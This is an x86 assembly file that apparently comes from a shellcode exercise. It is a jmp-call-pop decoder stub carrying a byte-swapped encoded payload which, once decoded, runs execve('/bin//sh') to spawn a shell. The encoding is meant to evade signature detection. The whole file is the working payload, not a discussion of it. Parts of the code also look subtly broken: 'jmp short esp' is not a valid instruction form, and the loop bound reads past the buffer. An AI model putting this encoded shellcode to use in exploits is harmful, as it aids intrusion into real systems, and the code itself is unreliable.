; Filename: encoder.asm
; Author: Simon Lemire / 2018
; Description: Encoder shellcode
; Note:

global _start

section .text

_start:
	jmp short call_shellcode

decoder:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	pop esi			; address of shellcode
	sub esp, 28		; make room on the stack for the decoded shellcode

decode:
	mov al, byte [esi + ecx] 
	mov bl, byte [esi + ecx + 1]
	mov byte [esp + ecx], bl
	mov byte [esp + ecx + 1], al
	mov al, byte [esi + ecx + 2]
    mov bl, byte [esi + ecx + 3]
	mov byte [esp + ecx + 2], bl
    mov byte [esp + ecx + 3], al
	cmp ecx, 28
	jz execute_shellcode
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	jnz decode

execute_shellcode:
	jmp short esp

call_shellcode:
	call decoder
	encoder_shellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x2f,0x68,0x73,0x2f,0x68,0x69,0x62,0x89,0x6e,0x50,0xe3,0xe2,0x89,0x89,0x53,0xb0,0xe1,0xcd,0x0b,0x90,0x80,0x90,0x90
